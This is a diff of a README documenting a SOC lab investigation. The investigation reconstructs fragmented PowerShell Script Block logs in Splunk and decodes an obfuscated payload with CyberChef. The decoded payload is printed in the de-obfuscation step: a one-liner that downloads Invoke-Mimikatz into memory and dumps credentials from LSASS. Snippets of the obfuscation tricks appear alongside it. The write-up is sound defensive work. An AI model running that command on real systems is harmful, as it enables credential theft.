@@ -9,9 +9,9 @@ The investigation involved reconstructing fragmented PowerShell logs, decoding m
 
 ---
 
-## 🎯 Objectives
+# 🎯 Objectives
 
-- Analyze Windows Event ID **4104** logs in Splunk
+- Analyze Windows Event ID 4104 logs in Splunk
 - Reconstruct fragmented PowerShell Script Blocks
 - Identify Indicators of Compromise (IOCs)
 - Reverse engineer an obfuscated PowerShell payload
@@ -37,55 +37,56 @@ The investigation involved reconstructing fragmented PowerShell logs, decoding m
 
 A suspicious workstation generated an alert after executing an unknown PowerShell command.
 
-The available evidence consisted of Windows PowerShell operational logs (`powershell_malicious.xml`) ingested into Splunk.
+A PowerShell operational log (`powershell_malicious.xml`) was ingested into Splunk for investigation.
 
-My responsibilities included:
+My objectives were to:
 
-- Investigating PowerShell Script Block logs
-- Reassembling fragmented script blocks
-- Identifying attacker obfuscation techniques
-- Decoding malicious payloads
-- Determining attacker intent
+- Investigate suspicious PowerShell activity
+- Reconstruct fragmented Script Block logs
+- Identify attacker obfuscation techniques
+- Decode the malicious payload
+- Determine attacker objectives
 
 ---
 
-# 📈 Investigation Workflow
+# 🔍 Investigation Workflow
 
-## Step 1 — Initial Log Investigation
+## Step 1 — Inspecting Imported Event Data
 
-Search the imported PowerShell logs.
+The investigation began by reviewing the imported Event ID 4104 logs.
 
 ```spl
 source="powershell_malicious.xml" "ScriptBlockText"
 ```
 
-This immediately exposed heavily obfuscated PowerShell containing randomized casing, split strings, and dynamically generated commands.
+The initial search revealed heavily obfuscated PowerShell containing randomized casing, dynamic variables, and encoded character arrays.
 
 ---
 
-## Step 2 — Discovering Log Fragmentation
+## Step 2 — Understanding Event Fragmentation
 
-A simple table search returned incomplete results.
+Windows had automatically split the large PowerShell script across multiple Script Block events.
+
+Additionally, Splunk displayed those events in reverse chronological order, making the execution wrapper appear before the actual payload.
+
+---
+
+## Step 3 — Extracting the Complete Raw Event
+
+Instead of relying on default fields, I used Splunk's internal `_raw` field to recover the complete event contents.
 
 ```spl
-source="powershell_malicious.xml" "ScriptBlockText"
-| table _time Event
-```
-
-Using Splunk's internal `_raw` field exposed the complete event.
-
-```spl
-source="powershell_malicious.xml" "ScriptBlockText"
+source="powershell_malicious.xml"
 | table _time _raw
 ```
 
-This revealed that Windows had automatically fragmented the script across multiple Event ID 4104 records.
+This exposed the complete PowerShell execution chain.
 
 ---
 
-## Step 3 — Reconstructing the Payload
+## Step 4 — Locating the Encoded Payload
 
-By correlating sequential events, I located the missing decimal character array responsible for generating the final PowerShell payload.
+Once the full event was reconstructed, I isolated the massive decimal character array responsible for generating the malicious PowerShell command.
 
 Example:
 
@@ -95,18 +96,16 @@ Example:
 
 ---
 
-## Step 4 — De-obfuscation
+## Step 5 — De-obfuscating the Malware
 
-The decimal array was copied into **CyberChef**.
+The decimal array was copied into CyberChef.
 
 Recipe:
 
 - From Decimal
 - Delimiter: Comma
 
-CyberChef converted the decimal values into the original PowerShell command.
-
-Decoded payload:
+CyberChef successfully decoded the payload into readable PowerShell.
 
 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');
@@ -115,9 +114,9 @@ Invoke-Mimikatz -DumpCreds
 
 ---
 
-# 🔐 Obfuscation Techniques Identified
+# 🔐 Obfuscation Techniques
 
-## Mixed Case Obfuscation
+### Mixed Case Randomization
 
 ```powershell
 FOReacH-ObJect
@@ -127,151 +126,179 @@ FOReacH-ObJect
 
 ---
 
-## Character Length Cipher
+### Character-Length Cipher
 
 ```powershell
 $_.Length - 1
 ```
 
-Instead of storing ASCII values directly, the malware dynamically calculated characters based on string lengths.
+The malware dynamically calculated ASCII values rather than storing them directly.
 
 ---
 
-## Dynamic Invoke-Expression
+### Dynamic Invoke-Expression Reconstruction
 
 ```powershell
 .(''.IndexOf.ToString()[106,482,184]-join'')
 ```
 
-The malware reconstructed the `IEX` command in memory to avoid detection.
+The malware rebuilt the `Invoke-Expression (IEX)` command entirely in memory.
 
 ---
 
-# 🚨 Indicators of Compromise (IOCs)
+# 🚨 Indicators of Compromise
 
 | Indicator | Description |
-|------------|-------------|
+|-----------|-------------|
 | Invoke-Mimikatz | Credential dumping utility |
 | PowerSploit | Offensive PowerShell framework |
 | Net.WebClient | Downloads payload directly into memory |
-| raw.githubusercontent.com | Remote payload hosting |
-| Invoke-Mimikatz -DumpCreds | Extracts credentials from LSASS |
+| raw.githubusercontent.com | Remote payload delivery |
+| Invoke-Mimikatz -DumpCreds | Dumps credentials from LSASS |
 
 ---
 
 # 🎯 Key Findings
 
-- Successfully reconstructed fragmented PowerShell Script Blocks
-- Bypassed Splunk UI truncation using `_raw`
+- Investigated Windows Event ID 4104 Script Block logs
+- Reconstructed fragmented PowerShell execution
+- Bypassed Splunk event truncation using `_raw`
 - Decoded multiple layers of PowerShell obfuscation
 - Identified a fileless malware execution chain
-- Confirmed remote payload retrieval from GitHub
-- Determined attacker objective was credential theft from LSASS
+- Confirmed remote retrieval of Invoke-Mimikatz
+- Determined attacker intent was credential theft from LSASS memory
 
 ---
 
 # 📚 Skills Demonstrated
 
-- Threat Hunting
-- Malware Analysis
 - Splunk SPL
-- Log Analysis
-- Windows Event Forensics
-- PowerShell Analysis
+- Threat Hunting
 - Incident Response
-- Threat Intelligence
+- Malware Analysis
+- Windows Event Log Analysis
+- PowerShell Analysis
 - CyberChef
-- Detection Engineering
+- Threat Intelligence
+- IOC Identification
+- Log Analysis
 
 ---
 
 # ⚠️ Challenges
 
-One of the biggest challenges was understanding why the malicious script appeared incomplete.
+One of the primary challenges was understanding why the malicious PowerShell appeared incomplete.
 
-Because:
-
-- Windows automatically fragments large PowerShell scripts
-- Splunk displays logs in reverse chronological order
-
-The execution wrapper appeared before the payload itself, requiring manual reconstruction of multiple events to recover the complete attack chain.
+Large Script Block logs are automatically fragmented by Windows, while Splunk displays events in reverse chronological order. Recovering the full attack required identifying related events, reconstructing the script, and extracting the original payload before de-obfuscation.
 
 ---
 
 # 🛡️ Detection Opportunities
 
-Potential improvements to detect similar attacks include:
+Future improvements could include:
 
 - Sigma rules for suspicious Event ID 4104 activity
-- YARA signatures for PowerShell obfuscation
+- YARA rules targeting PowerShell obfuscation
 - Sysmon Event ID 10 monitoring for LSASS access
 - PowerShell Constrained Language Mode (CLM)
-- AppLocker or WDAC enforcement
-- Network monitoring for suspicious `Net.WebClient` downloads
+- AppLocker or WDAC policy enforcement
+- Detection rules for suspicious Net.WebClient activity
 
 ---
 
-# 📸 Investigation Screenshots
+# 📸 Investigation Walkthrough
 
-Add your screenshots below.
+## 1. Custom Event Breaking During Log Ingestion
 
-## 1. Initial PowerShell Event Search
+![](images/01_splunk_custom_event_breaks.png)
 
-```
-images/01-search-results.png
-```
+Configured custom event breaking to correctly parse imported PowerShell logs.
 
 ---
 
-## 2. Discovering Fragmented Script Blocks
+## 2. Timestamp Parsing Issue
 
-```
-images/02-fragmented-events.png
-```
+![](images/02_splunk_timestamp_error.png)
 
----
-
-## 3. Full Raw Event Inspection
-
-```
-images/03-raw-event.png
-```
+Resolved timestamp parsing inconsistencies before beginning log analysis.
 
 ---
 
-## 4. Obfuscated Decimal Array
+## 3. Initial Search Results
 
-```
-images/04-decimal-array.png
-```
+![](images/04_splunk_search_results.png)
 
----
-
-## 5. CyberChef De-obfuscation
-
-```
-images/05-cyberchef.png
-```
+Performed the initial search for suspicious PowerShell Script Block activity.
 
 ---
 
-## 6. Decoded Mimikatz Payload
+## 4. Identifying the Suspicious Payload
 
-```
-images/06-final-payload.png
-```
+![](images/05_splunk_payload_found.png)
+
+Located the obfuscated PowerShell execution wrapper.
 
 ---
 
-# 📖 What I Learned
+## 5. Statistics View Analysis
 
-This project reinforced several important SOC and threat hunting concepts:
+![](images/07_splunk_statistics_view.png)
 
-- Fileless malware often relies on legitimate Windows tools to evade detection.
+Used Splunk statistics to identify relevant events and reduce investigation scope.
+
+---
+
+## 6. Isolating the Malicious Payload
+
+![](images/08_splunk_isolated_payload.png)
+
+Separated the suspicious Script Block from surrounding log data.
+
+---
+
+## 7. Viewing the Complete Raw Event
+
+![](images/10_splunk_expanded_raw.png)
+
+Expanded the `_raw` event to reconstruct the complete PowerShell execution chain.
+
+---
+
+## 8. Preparing for De-obfuscation
+
+![](images/12_cyberchef_ready.png)
+
+Prepared the extracted payload for decoding in CyberChef.
+
+---
+
+## 9. Recovering the Decimal Character Array
+
+![](images/14_splunk_raw_decimal_payload.png)
+
+Located the encoded decimal array used to reconstruct the malicious PowerShell command.
+
+---
+
+## 10. Decoded Malware Payload
+
+![](images/15_cyberchef_decoded_mimikatz.png)
+
+CyberChef decoded the payload, revealing an `Invoke-Mimikatz` credential-dumping attack delivered directly into memory.
+
+---
+
+# 📖 Lessons Learned
+
+This investigation demonstrated how modern fileless malware uses PowerShell obfuscation and legitimate Windows functionality to evade traditional security controls.
+
+Key takeaways include:
+
 - Event ID 4104 provides valuable visibility into PowerShell execution.
-- Log fragmentation can obscure malicious activity unless events are reconstructed.
-- Splunk's internal fields (`_raw`) are essential when investigating truncated logs.
-- CyberChef is a powerful tool for decoding and analyzing obfuscated malware.
+- Large PowerShell scripts are automatically fragmented and must be reconstructed.
+- Splunk's `_raw` field is critical when investigating truncated events.
+- CyberChef is an effective tool for decoding layered PowerShell obfuscation.
+- Threat hunting often requires correlating multiple events rather than relying on a single log entry.
 
 ---
 
@@ -279,4 +306,4 @@ This project reinforced several important SOC and threat hunting concepts:
 
 **Yvener Bazile**
 
-Cloud Security • SOC Analyst • Threat Hunting • AWS • Splunk
+Cloud Security • SOC Analyst • Threat Hunting • Azure • Splunk
